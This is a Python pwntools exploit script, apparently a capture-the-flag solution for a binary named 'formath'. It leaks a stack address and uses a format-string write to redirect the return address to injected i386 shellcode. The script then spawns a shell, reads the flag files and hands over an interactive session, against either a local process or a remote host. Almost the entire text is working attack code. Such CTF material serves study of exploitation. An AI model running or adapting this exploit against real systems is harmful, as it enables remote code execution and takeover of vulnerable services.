import argparse
import re
import struct
from pwn import *
# from libformatstr import FormatStr

# context.log_level = 'debug'

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    # --remote <host> <port>
    parser.add_argument('--remote', nargs=2, metavar=('host', 'port'), required=False)
    parser.add_argument('--local', action='store_true', required=False)
    args = parser.parse_args()

    assert args.remote or args.local, 'Must specify either --remote or --local'

    if args.local:
        r = process(['./formath'])
    else:
        r = remote(args.remote[0], args.remote[1])

    # leak stack address
    r.recvuntil(b'Execution id: ')
    stack_ptr = int(r.recv(10)[2:], 16)
    log.info('stack_ptr: %#x' % stack_ptr)
    ret_addr = stack_ptr + 1188 # gdb b main, then info frame
    log.info('ret_addr: %#x' % ret_addr)
    shellcode_addr = stack_ptr + 1092 # type absABBBBBBBB as math function then ctrl-c and search-pattern 0x42424242

    # def exec_fmt(payload):
    #     if args.local:
    #         r = process(['./badtable'])
    #     else:
    #         r = remote(args.remote[0], args.remote[1])
    #     r.sendlineafter('Please provide a mathematical function: ', 'abs')
    #     r.sendlineafter('Please provide a parameter:', payload)
    #     ret = r.recvuntil('returned')
    #     r.close()
    #     return ret
    # format_string = FmtStr(execute_fmt=exec_fmt)
    # offset = format_string.offset
    offset = 10

    # prepare format string
    payload = fmtstr_payload(offset, {ret_addr: shellcode_addr}, numbwritten=28)

    # exploit
    shellcode = asm(shellcraft.i386.linux.sh())
    r.sendlineafter(b'Please provide a mathematical function: ', b'abs\x00'+b'\x90'*4+shellcode)
    r.sendlineafter(b'Please provide a parameter: ', b'__'+payload)
    r.clean()
    r.sendline(b'cat /flag*')
    print(r.recv())
    r.interactive()
